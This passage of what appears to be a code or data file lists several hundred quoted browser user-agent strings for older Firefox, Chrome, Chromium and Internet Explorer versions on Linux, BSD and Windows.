'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.612.3 Chrome/10.0.612.3 Safari/534.15',
'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.611.0 Chrome/10.0.611.0 Safari/534.15',
'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16',
'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.134 Safari/534.16',
'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.648.0 Chrome/10.0.648.0 Safari/534.16',
'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16',
'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.24 Safari/534.7',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1) Gecko/20090701 Ubuntu/9.04 (jaunty) Firefox/3.5',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090729 Slackware/13.0 Firefox/3.5.2',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2pre) Gecko/20090729 Ubuntu/9.04 (jaunty) Firefox/3.5.1',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.3) Gecko/20090912 Gentoo Firefox/3.5.3 FirePHP/0.3',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.3) Gecko/20090919 Firefox/3.5.3',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.4) Gecko/20091028 Ubuntu/9.10 (karmic) Firefox/3.5.9',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.6) Gecko/20100118 Gentoo Firefox/3.5.6',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100315 Ubuntu/9.10 (karmic) Firefox/3.5.9',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100401 Ubuntu/9.10 (karmic) Firefox/3.5.9 GTB7.1',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6 FirePHP/0.4',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2) Gecko/20100115 Ubuntu/10.04 (lucid) Firefox/3.6',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2) Gecko/20100128 Gentoo Firefox/3.6',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.1) Gecko/20100122 firefox/3.6.1',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.10) Gecko/20100915 Ubuntu/9.04 (jaunty) Firefox/3.6.10',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.10pre) Gecko/20100902 Ubuntu/9.10 (karmic) Firefox/3.6.1pre',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.14pre) Gecko/20110105 Firefox/3.6.14pre',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.15) Gecko/20110303 Ubuntu/10.04 (lucid) Firefox/3.6.15 FirePHP/0.5',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.16) Gecko/20110323 Ubuntu/9.10 (karmic) Firefox/3.6.16 FirePHP/0.5',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.16pre) Gecko/20110304 Ubuntu/10.10 (maverick) Firefox/3.6.15pre',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.3',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100312 Ubuntu/9.04 (jaunty) Firefox/3.6',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB7.1',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100404 Ubuntu/10.04 (lucid) Firefox/3.6.3',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.4) Gecko/20100625 Gentoo Firefox/3.6.4',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.7) Gecko/20100726 CentOS/3.6-3.el5.centos Firefox/3.6.7',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.8) Gecko/20100727 Firefox/3.6.8',
'Mozilla/5.0 (X11; U; Linux i686; en-us; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.04 (jaunty) Firefox/3.5',
'Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.1.8) Gecko/20100214 Ubuntu/9.10 (karmic) Firefox/3.5.8',
'Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10',
'Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.1.6) Gecko/20091201 SUSE/3.5.6-1.1.1 Firefox/3.5.6 GTB6',
'Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.1.7) Gecko/20091222 SUSE/3.5.7-1.1.1 Firefox/3.5.7',
'Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.1.9) Gecko/20100317 SUSE/3.5.9-0.1 Firefox/3.5.9',
'Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.13) Gecko/20101206 Ubuntu/9.10 (karmic) Firefox/3.6.13',
'Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8',
'Mozilla/5.0 (X11; U; Linux i686; fr-FR; rv:1.9.1) Gecko/20090624 Ubuntu/9.04 (jaunty) Firefox/3.5',
'Mozilla/5.0 (X11; U; Linux i686; fr-FR; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10',
'Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5',
'Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
'Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2',
'Mozilla/5.0 (X11; U; Linux i686; hu-HU; rv:1.9.1.9) Gecko/20100330 Fedora/3.5.9-1.fc12 Firefox/3.5.9',
'Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.04 (jaunty) Firefox/3.5',
'Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8',
'Mozilla/5.0 (X11; U; Linux i686; ja-JP; rv:1.9.1.8) Gecko/20100216 Fedora/3.5.8-1.fc12 Firefox/3.5.8',
'Mozilla/5.0 (X11; U; Linux i686; ja; rv:1.9.1) Gecko/20090624 Firefox/3.5 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (X11; U; Linux i686; ko-KR; rv:1.9.2.12) Gecko/20101027 Ubuntu/10.10 (maverick) Firefox/3.6.12',
'Mozilla/5.0 (X11; U; Linux i686; ko-KR; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3',
'Mozilla/5.0 (X11; U; Linux i686; nl-NL; rv:1.9.1b4) Gecko/20090423 Firefox/3.5b4',
'Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1',
'Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.9.1.9) Gecko/20100401 Ubuntu/9.10 (karmic) Firefox/3.5.9',
'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8',
'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.2.10) Gecko/20100915 Ubuntu/10.04 (lucid) Firefox/3.6.10',
'Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.2.13) Gecko/20101209 Fedora/3.6.13-1.fc13 Firefox/3.6.13',
'Mozilla/5.0 (X11; U; Linux i686; ru-RU; rv:1.9.1.2) Gecko/20090804 Firefox/3.5.2',
'Mozilla/5.0 (X11; U; Linux i686; ru-RU; rv:1.9.2a1pre) Gecko/20090405 Ubuntu/9.04 (jaunty) Firefox/3.6a1pre',
'Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.1.3) Gecko/20091020 Ubuntu/9.10 (karmic) Firefox/3.5.3',
'Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13',
'Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8',
'Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.3a5pre) Gecko/20100526 Firefox/3.7a5pre',
'Mozilla/5.0 (X11; U; Linux i686; zh-CN; rv:1.9.1.6) Gecko/20091216 Fedora/3.5.6-1.fc11 Firefox/3.5.6 GTB6',
'Mozilla/5.0 (X11; U; Linux i686; zh-CN; rv:1.9.1.8) Gecko/20100216 Fedora/3.5.8-1.fc12 Firefox/3.5.8',
'Mozilla/5.0 (X11; U; Linux i686; zh-CN; rv:1.9.2.8) Gecko/20100722 Ubuntu/10.04 (lucid) Firefox/3.6.8',
'Mozilla/5.0 (X11; U; Linux ppc; fr; rv:1.9.2.12) Gecko/20101027 Ubuntu/10.10 (maverick) Firefox/3.6.12',
'Mozilla/5.0 (X11; U; Linux x86; rv:1.9.1.1) Gecko/20090716 Linux Firefox/3.5.1',
'Mozilla/5.0 (X11; U; Linux x86_64; cs-CZ; rv:1.9.1.7) Gecko/20100106 Ubuntu/9.10 (karmic) Firefox/3.5.7',
'Mozilla/5.0 (X11; U; Linux x86_64; cs-CZ; rv:1.9.1.9) Gecko/20100317 SUSE/3.5.9-0.1.1 Firefox/3.5.9',
'Mozilla/5.0 (X11; U; Linux x86_64; cs-CZ; rv:1.9.2.10) Gecko/20100915 Ubuntu/10.04 (lucid) Firefox/3.6.10',
'Mozilla/5.0 (X11; U; Linux x86_64; da-DK; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13',
'Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.1.10) Gecko/20100506 SUSE/3.5.10-0.1.1 Firefox/3.5.10',
'Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2) Gecko/20100308 Ubuntu/10.04 (lucid) Firefox/3.6',
'Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10 GTB7.1',
'Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.3) Gecko/20100401 SUSE/3.6.3-1.1 Firefox/3.6.3',
'Mozilla/5.0 (X11; U; Linux x86_64; el-GR; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10',
'Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.9.2.13) Gecko/20101206 Red Hat/3.6-2.el5 Firefox/3.6.13',
'Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.9.2.13) Gecko/20101206 Ubuntu/9.10 (karmic) Firefox/3.6.13',
'Mozilla/5.0 (X11; U; Linux x86_64; en-NZ; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.544.0 Safari/534.10',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.200 Safari/534.10',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Ubuntu/10.10 Chromium/8.0.552.237 Chrome/8.0.552.237 Safari/534.10',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Ubuntu/10.04 Chromium/9.0.595.0 Chrome/9.0.595.0 Safari/534.13',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Ubuntu/10.10 Chromium/9.0.600.0 Chrome/9.0.600.0 Safari/534.14',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.127 Safari/534.16',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.82 Safari/534.16',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.642.0 Chrome/10.0.642.0 Safari/534.16',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.648.0 Chrome/10.0.648.0 Safari/534.16',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.648.127 Chrome/10.0.648.127 Safari/534.16',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 SUSE/10.0.626.0 (KHTML, like Gecko) Chrome/10.0.626.0 Safari/534.16',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/8.1.0.0 Safari/540.0',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML,like Gecko) Chrome/9.1.0.0 Safari/540.0',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1) Gecko/20090630 Firefox/3.5 GTB6',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090714 SUSE/3.5.1-1.1 Firefox/3.5.1',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Firefox/3.5.1',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Linux Mint/7 (Gloria) Firefox/3.5.1',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.15) Gecko/20101027 Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.2) Gecko/20090803 Firefox/3.5.2 Slackware',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.2) Gecko/20090803 Slackware Firefox/3.5.2',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090914 Slackware/13.0_stable Firefox/3.5.3',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091114 Gentoo Firefox/3.5.5',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.6) Gecko/20100117 Gentoo Firefox/3.5.6',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.8) Gecko/20100318 Gentoo Firefox/3.5.8',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.8pre) Gecko/20091227 Ubuntu/9.10 (karmic) Firefox/3.5.5',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2) Gecko/20100130 Gentoo Firefox/3.6',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2) Gecko/20100222 Ubuntu/10.04 (lucid) Firefox/3.6',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2) Gecko/20100305 Gentoo Firefox/3.5.7',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10 GTB7.1',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.12) Gecko/20101102 Firefox/3.6.12',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.12) Gecko/20101102 Gentoo Firefox/3.6.12',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101206 Firefox/3.6.13',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101206 Red Hat/3.6-3.el4 Firefox/3.6.13',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101219 Gentoo Firefox/3.6.13',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101223 Gentoo Firefox/3.6.13',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100403 Firefox/3.6.3',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100524 Firefox/3.5.1',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.4) Gecko/20100614 Ubuntu/10.04 (lucid) Firefox/3.6.4',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.6) Gecko/20100628 Ubuntu/10.04 (lucid) Firefox/3.6.6',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.6) Gecko/20100628 Ubuntu/10.04 (lucid) Firefox/3.6.6 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.6) Gecko/20100628 Ubuntu/10.04 (lucid) Firefox/3.6.6 GTB7.0',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.6) Gecko/20100628 Ubuntu/10.04 (lucid) Firefox/3.6.6 GTB7.1',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100723 Fedora/3.6.7-1.fc13 Firefox/3.6.7',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100723 SUSE/3.6.8-0.1.1 Firefox/3.6.8',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2a1pre) Gecko/20090405 Firefox/3.6a1pre',
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2a1pre) Gecko/20090428 Firefox/3.6a1pre',
'Mozilla/5.0 (X11; U; Linux x86_64; en-ca) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/531.2+',
'Mozilla/5.0 (X11; U; Linux x86_64; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/531.2+',
'Mozilla/5.0 (X11; U; Linux x86_64; es-CL; rv:1.9.1.9) Gecko/20100402 Ubuntu/9.10 (karmic) Firefox/3.5.9',
'Mozilla/5.0 (X11; U; Linux x86_64; es-ES; rv:1.9.1.8) Gecko/20100216 Fedora/3.5.8-1.fc11 Firefox/3.5.8',
'Mozilla/5.0 (X11; U; Linux x86_64; es-ES; rv:1.9.2.12) Gecko/20101026 SUSE/3.6.12-0.7.1 Firefox/3.6.12',
'Mozilla/5.0 (X11; U; Linux x86_64; es-ES; rv:1.9.2.12) Gecko/20101027 Fedora/3.6.12-1.fc13 Firefox/3.6.12',
'Mozilla/5.0 (X11; U; Linux x86_64; es-MX; rv:1.9.2.12) Gecko/20101027 Ubuntu/10.04 (lucid) Firefox/3.6.12',
'Mozilla/5.0 (X11; U; Linux x86_64; fr-FR) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
'Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.1.5) Gecko/20091109 Ubuntu/9.10 (karmic) Firefox/3.5.3pre',
'Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.1.5) Gecko/20091109 Ubuntu/9.10 (karmic) Firefox/3.5.5',
'Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.1.6) Gecko/20091215 Ubuntu/9.10 (karmic) Firefox/3.5.6',
'Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.1.9) Gecko/20100317 SUSE/3.5.9-0.1.1 Firefox/3.5.9 GTB7.0',
'Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13',
'Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.2.13) Gecko/20110103 Fedora/3.6.13-1.fc14 Firefox/3.6.13',
'Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.2.3) Gecko/20100403 Fedora/3.6.3-4.fc13 Firefox/3.6.3',
'Mozilla/5.0 (X11; U; Linux x86_64; it; rv:1.9.1.15) Gecko/20101027 Fedora/3.5.15-1.fc12 Firefox/3.5.15',
'Mozilla/5.0 (X11; U; Linux x86_64; it; rv:1.9.1.9) Gecko/20100330 Fedora/3.5.9-2.fc12 Firefox/3.5.9',
'Mozilla/5.0 (X11; U; Linux x86_64; it; rv:1.9.1.9) Gecko/20100402 Ubuntu/9.10 (karmic) Firefox/3.5.9 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (X11; U; Linux x86_64; it; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.04 (lucid) Firefox/3.6.13 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (X11; U; Linux x86_64; ja-JP; rv:1.9.2.16) Gecko/20110323 Ubuntu/10.10 (maverick) Firefox/3.6.16',
'Mozilla/5.0 (X11; U; Linux x86_64; ja; rv:1.9.1.4) Gecko/20091016 SUSE/3.5.4-1.1.2 Firefox/3.5.4',
'Mozilla/5.0 (X11; U; Linux x86_64; nb-NO; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.04 (lucid) Firefox/3.6.13',
'Mozilla/5.0 (X11; U; Linux x86_64; pl-PL; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10',
'Mozilla/5.0 (X11; U; Linux x86_64; pl-PL; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.04 (lucid) Firefox/3.6.13',
'Mozilla/5.0 (X11; U; Linux x86_64; pl-PL; rv:2.0) Gecko/20110307 Firefox/4.0',
'Mozilla/5.0 (X11; U; Linux x86_64; pl; rv:1.9.1.2) Gecko/20090911 Slackware Firefox/3.5.2',
'Mozilla/5.0 (X11; U; Linux x86_64; pt-BR; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10',
'Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.1.8) Gecko/20100216 Fedora/3.5.8-1.fc12 Firefox/3.5.8',
'Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.2.11) Gecko/20101028 CentOS/3.6-2.el5.centos Firefox/3.6.11',
'Mozilla/5.0 (X11; U; Linux x86_64; rv:1.9.1.1) Gecko/20090716 Linux Firefox/3.5.1',
'Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10',
'Mozilla/5.0 (X11; U; Linux; en-US; rv:1.9.1.11) Gecko/20100720 Firefox/3.5.11',
'Mozilla/5.0 (X11; U; NetBSD i386; en-US; rv:1.9.2.12) Gecko/20101030 Firefox/3.6.12',
'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.2.8) Gecko/20101230 Firefox/3.6.8',
'Mozilla/5.0 (X11; U; Windows NT 6; en-US) AppleWebKit/534.12 (KHTML, like Gecko) Chrome/9.0.587.0 Safari/534.12',
'Mozilla/5.0 (X11;U; Linux i686; en-GB; rv:1.9.1) Gecko/20090624 Ubuntu/9.04 (jaunty) Firefox/3.5',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/4.0; FBSMTWB; .NET CLR 2.0.34861; .NET CLR 3.0.3746.3218; .NET CLR 3.5.33652; msn OptimizedIE8;ENUS)',
'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 3.0.04506.30)',
'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)',
'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)',
'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; Media Center PC 4.0; SLCC1; .NET CLR 3.0.04320)',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/11.0.696.57)',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0',
